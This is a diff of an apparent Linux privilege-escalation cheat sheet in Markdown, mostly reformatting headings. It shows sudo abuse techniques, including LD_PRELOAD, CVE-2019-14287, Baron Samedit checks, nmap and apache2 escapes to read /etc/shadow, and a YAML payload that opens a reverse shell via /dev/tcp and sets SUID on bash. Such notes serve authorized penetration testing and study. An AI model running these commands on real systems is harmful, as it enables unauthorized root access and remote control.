@@ -78,6 +78,7 @@
 [Gaining TTY](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/gaining-tty.rst)  
 [Breaking out of shellcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)   
 [Restricted Shell Bypass](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)   
+[Shell Escapes](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)     
 
 ## Quick Enumeration Commands  
     hostname; ip addr;    
@@ -127,7 +128,7 @@ Verify web app is running in a Docker container - look for .dockerenv file in ro
 
 sudo -l, cat /etc/sudoers, check gtfobins  
 sudo -V    
-## Sudo LD_PRELOAD   
+### Sudo LD_PRELOAD   
 [Reference](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) 
 sudo -l, see env_keep+=LD_PRELOAD. apache2
 
@@ -144,20 +145,20 @@ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
 
 sudo LD_PRELOAD=/tmp/preload.so [sudo binary] 
 
-## CVE-2019-14287 
+### CVE-2019-14287 
 Sudo versions < 1.8.28. Sees -1 and reads as 0 (UID of root) 
 
 sudo -l, see (ALL,!root)  
 
     sudo -u#-1 [binary escape]  
     
-## CVE-2019-16634 Buffer Overflow 
+### CVE-2019-16634 Buffer Overflow 
 versions of sudo earlier than 1.8.26  
 sudo su root, type password, see ******: pwfeedback enabled in /etc/sudoers. Buffer overflow attack against password feedback.   
 
 [exploit](https://github.com/saleemrashid/sudo-cve-2019-18634)  
 
-## CVE-2021-3156 - Baron Samedit Heap Buffer Overflow 
+### CVE-2021-3156 - Baron Samedit Heap Buffer Overflow 
 [Qualys blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)  
 [poc 2](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)   
 [exploit](https://github.com/blasty/CVE-2021-3156)  
@@ -166,7 +167,7 @@ any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1
 
     sudoedit -s '\' $(python3 -c 'print("A"*1000)')                  #check to see if machine is exploitable 
 
-## Misc sudo binaries  
+### Misc sudo binaries  
 nmap 
 
     echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
@@ -174,7 +175,7 @@ apache2
 
     sudo apache2 -f /etc/shadow    
     
-# Code Execution Through Yaml Using Ruby   
+### Sudo - Code Execution Through Yaml Using Ruby   
 See this guide: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ruby-privilege-escalation/    
 $ sudo -l     
 Matching Defaults entries for user on x:    
@@ -183,15 +184,12 @@ Matching Defaults entries for user on x:
 User may run the following commands on x:   
     (root) NOPASSWD: /usr/bin/ruby /sample.rb   
 
-def list_from_file   
-    YAML.load(File.read("dependencies.yml"))    
-End   
+    def list_from_file   
+        YAML.load(File.read("dependencies.yml"))    
+    End   
 
-
- git_set:"bash -c 'bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1'"    
- git_set: "chmod +s /bin/bash"    
-
-
+    git_set:"bash -c 'bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1'"    
+    git_set: "chmod +s /bin/bash"    
 
 ## Cronjobs    
 look for scripts you can write to running as a cronjob, writeable cron directory/crontab, writeable PATH directories used, wildcard expansion 
@@ -348,12 +346,6 @@ No compilers on host: use gcc-multilib -m32 (32 bit OS) or -m64 (64 bit OS) then
 
     gcc -m32 -o output32 exploit.c     #(32 bit) 
     gcc -m64 -o output exploit.c       #(64 bit)  
-    
-## Further Access into a Network 
-### Network Enumeration 
-    netstat -antp; arp -a 
-    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " " 
-    cat /etc/hosts  
 
 # Resources 
 ## Learn More 
